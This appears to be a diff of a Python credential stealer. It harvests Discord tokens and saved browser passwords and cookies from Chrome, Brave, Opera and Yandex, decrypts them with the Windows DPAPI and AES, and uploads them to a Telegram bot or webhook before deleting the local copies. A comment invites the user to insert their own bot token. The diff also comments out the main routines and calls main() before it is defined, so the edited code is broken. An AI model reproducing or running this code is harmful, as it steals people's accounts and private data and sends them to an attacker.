@@ -4,15 +4,11 @@ from base64 import b64decode
 from json import loads
 from shutil import copy2
 from sqlite3 import connect
-
 import win32crypt
 from Cryptodome.Cipher import AES
 from requests import post
-
-
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
-
 tokenPaths = {
     'Discord': f"{roaming}\\Discord",
     'Discord Canary': f"{roaming}\\discordcanary",
@@ -23,7 +19,6 @@ tokenPaths = {
     'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
     'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
 }
-
 browser_loc = {
     "Chrome": f"{local}\\Google\\Chrome",
     "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
@@ -31,16 +26,27 @@ browser_loc = {
     "Opera": f"{roaming}\\Opera Software\\Opera Stable",
     "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
 }
-
 fileCookies = "cooks_" + os.getlogin() + ".txt"
 filePass = "passes_" + os.getlogin() + ".txt"
 fileInfo = "info_" + os.getlogin() + ".txt"
-
 # CHROME PROFILES
 for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
     if i.startswith("Profile "):
         browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"
 # DISCORD TOKENS
+# DECRYPT CIPHERS
+# DECRYPT BROWSER
+# PATH SHIT
+# WEBHOOK
+for_handler = (
+    fileInfo,
+    filePass,
+    fileCookies,
+    "TempMan.db",
+    "CookMe.db"
+)
+main()
+
 def decrypt_token(buff, master_key):
     try:
         return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
@@ -92,17 +98,12 @@ def get_tokens(path):
 
     return done
 
-
-# DECRYPT CIPHERS
 def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)
-
 
 def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
 
-
-# DECRYPT BROWSER
 def decrypt_browser(LocalState, LoginData, CookiesFile, name):
     if os.path.exists(LocalState):
         with open(LocalState) as f:
@@ -176,12 +177,8 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
         with open(fileInfo, "a") as f:
             f.write(f"{name} Local State file missing\n")
 
-
-
-# PATH SHIT
 def Local_State(path):
     return f"{path}\\User Data\\Local State"
-
 
 def Login_Data(path):
     if "Profile" in path:
@@ -189,28 +186,25 @@ def Login_Data(path):
     else:
         return f"{path}\\User Data\\Default\\Login Data"
 
-
 def Cookies(path):
     if "Profile" in path:
         return f"{path}\\Network\\Cookies"
     else:
         return f"{path}\\User Data\\Default\\Network\\Cookies"
 
-
-def main_tokens():
-    for platform, path in tokenPaths.items():
-        if not os.path.exists(path):
-            continue
-        try:
-            tokens = set(get_tokens(path))
-        except:
-            continue
-        if not tokens:
-            continue
-        with open(fileInfo, "a") as f:
-            for i in tokens:
-                f.write(str(i) + "\n")
-
+# def main_tokens():
+#     for platform, path in tokenPaths.items():
+#         if not os.path.exists(path):
+#             continue
+#         try:
+#             tokens = set(get_tokens(path))
+#         except:
+#             continue
+#         if not tokens:
+#             continue
+#         with open(fileInfo, "a") as f:
+#             for i in tokens:
+#                 f.write(str(i) + "\n")
 
 def decrypt_files(path, browser):
     if os.path.exists(path):
@@ -219,8 +213,6 @@ def decrypt_files(path, browser):
         with open(fileInfo, "a") as f:
             f.write(browser + " not installed\n")
 
-
-# WEBHOOK
 def post_to(file):
     token = "TELEGRAM TOKEN"     # put your token in here, if you don't wanna use telegram leave it like it is
     chat_id = "TELEGRAM CHATID"  # "    chatid          "                     telegram      "
@@ -241,29 +233,15 @@ def post_to(file):
     else:
         post(webhook_url, files={'files': open(file, 'rb')})
 
-
-for_handler = (
-    fileInfo,
-    filePass,
-    fileCookies,
-    "TempMan.db",
-    "CookMe.db"
-)
-
-
 def file_handler(file):
     if os.path.exists(file):
         if ".txt" in file:
             post_to(file)
         os.remove(file)
 
-
-def main():
-    for name, path in browser_loc.items():
-        decrypt_files(path, name)
-    main_tokens()
-    for i in for_handler:
-        file_handler(i)
-
-
-main()
+# def main():
+#     for name, path in browser_loc.items():
+#         decrypt_files(path, name)
+#     main_tokens()
+#     for i in for_handler:
+#         file_handler(i)
